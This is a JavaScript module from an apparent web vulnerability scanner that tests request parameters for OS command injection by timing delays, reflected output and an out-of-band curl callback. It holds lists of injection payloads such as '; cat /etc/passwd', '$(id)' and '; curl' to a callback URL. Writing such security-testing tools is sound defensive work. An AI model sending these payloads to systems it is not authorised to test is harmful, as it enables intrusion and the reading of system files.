/**
 * Feature 7C — OS Command Injection Scanner Module
 *
 * Techniques:
 *   1. Time-based blind — inject sleep/ping and measure delay
 *   2. Output reflection — look for uid=, root, WINDOWS in response
 *   3. OAST callback (blind detection)
 *
 * All payloads are static string constants.
 */

import { sendProbe, extractParams, makeFinding } from './index.js';
import { SCANNER_TIMING_THRESHOLD_MS } from '#shared/webConstants.js';

// ─── Payload constants ─────────────────────────────────────────────────────────

const TIME_PAYLOADS = [
  '; sleep 5',
  '| sleep 5',
  '`sleep 5`',
  '$(sleep 5)',
  '; ping -c 5 127.0.0.1;',
  '& timeout /T 5',        // Windows
  '| timeout 5',           // Windows
];

const REFLECT_PAYLOADS = [
  '; id',
  '| id',
  '`id`',
  '$(id)',
  '; whoami',
  '| whoami',
  '& whoami',
  '; cat /etc/passwd',
  '| type C:\\Windows\\win.ini',
];

const OUTPUT_PATTERNS = [
  /uid=\d+\(/,
  /root:x:0:0/,
  /daemon:x:/,
  /\[fonts\]/i,
  /WINDOWS/i,
  /Microsoft Windows/i,
];

// ─── Module runner ─────────────────────────────────────────────────────────────

export async function runCmdInjection(target, opts) {
  const { signal, timeoutMs, oastCallbackUrl } = opts;
  const findings = [];
  const params   = extractParams(target);

  if (!params.length) return findings;

  for (const param of params) {
    if (signal?.aborted) break;

    // ── Baseline ─────────────────────────────────────────────────────────────
    let baselineMs = 0;
    try {
      const base = await sendProbe(
        { method: target.method, url: target.url, headers: target.requestHeaders, body: target.body, timeoutMs },
        signal,
      );
      baselineMs = base.durationMs;
    } catch {}

    // ── 1. Output reflection ─────────────────────────────────────────────────
    for (const payload of REFLECT_PAYLOADS) {
      if (signal?.aborted) break;
      if (findings.some(f => f.parameter === param.name && f.type === 'cmdInjection' && f.severity === 'critical')) break;
      const injected = param.inject(param.value + payload);
      try {
        const resp = await sendProbe(
          { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs },
          signal,
        );
        for (const pattern of OUTPUT_PATTERNS) {
          if (pattern.test(resp.body)) {
            findings.push(makeFinding({
              severity:    'critical',
              type:        'cmdInjection',
              title:       `OS Command Injection (Output Reflected) in parameter "${param.name}"`,
              description: `The "${param.name}" parameter is vulnerable to command injection. The payload "${payload}" caused system command output to appear in the response.`,
              url:         target.url,
              parameter:   param.name,
              payload:     param.value + payload,
              evidence:    {
                request:  `${target.method} ${target.url}`,
                response: resp.body.slice(0, 500),
                matched:  pattern.toString(),
              },
              remediation: 'Never pass user input to OS commands. Use language-native APIs instead of shell invocations. If unavoidable, use an allowlist of safe arguments.',
              references:  ['CWE-78', 'OWASP A03:2021'],
            }));
            break;
          }
        }
      } catch (err) {
        if (err.name === 'AbortError') return findings;
      }
    }

    // ── 2. Time-based blind ──────────────────────────────────────────────────
    if (!findings.some(f => f.parameter === param.name && f.type === 'cmdInjection')) {
      for (const payload of TIME_PAYLOADS) {
        if (signal?.aborted) break;
        const injected = param.inject(param.value + payload);
        try {
          const t0   = Date.now();
          const resp = await sendProbe(
            { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs: timeoutMs + 6000 },
            signal,
          );
          const elapsed = Date.now() - t0;
          if (elapsed >= SCANNER_TIMING_THRESHOLD_MS + baselineMs) {
            findings.push(makeFinding({
              severity:    'high',
              type:        'cmdInjection',
              title:       `OS Command Injection (Time-Based Blind) in parameter "${param.name}"`,
              description: `The "${param.name}" parameter caused a ${elapsed}ms delay (baseline: ${baselineMs}ms) when injected with a sleep command, indicating blind OS command injection.`,
              url:         target.url,
              parameter:   param.name,
              payload:     param.value + payload,
              evidence:    {
                request:  `${target.method} ${target.url}`,
                response: `HTTP ${resp.statusCode} — ${elapsed}ms (baseline: ${baselineMs}ms)`,
                timingMs: elapsed,
              },
              remediation: 'Never pass user input to OS commands. Use language-native APIs.',
              references:  ['CWE-78', 'OWASP A03:2021'],
            }));
            break;
          }
        } catch (err) {
          if (err.name === 'AbortError') return findings;
        }
      }
    }

    // ── 3. OAST callback ─────────────────────────────────────────────────────
    if (oastCallbackUrl && !findings.some(f => f.parameter === param.name && f.type === 'cmdInjection')) {
      const oastId = `cmdi-${crypto.randomUUID().slice(0,8)}`;
      const callbackUrl = `${oastCallbackUrl}/${oastId}`;
      const curlPayload = `; curl ${callbackUrl}`;
      const injected = param.inject(param.value + curlPayload);
      try {
        await sendProbe(
          { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs },
          signal,
        );
        findings.push(makeFinding({
          severity:    'info',
          type:        'cmdInjection',
          title:       `Command Injection OAST Probe Sent for parameter "${param.name}"`,
          description: `A curl-based OAST payload was injected into "${param.name}". Monitor the OAST panel for an incoming request, which would confirm blind command injection.`,
          url:         target.url,
          parameter:   param.name,
          payload:     param.value + curlPayload,
          evidence:    { oastUrl: callbackUrl },
          remediation: 'Never pass user input to OS commands.',
          references:  ['CWE-78', 'OWASP A03:2021'],
        }));
      } catch (err) {
        if (err.name === 'AbortError') return findings;
      }
    }
  }

  return findings;
}
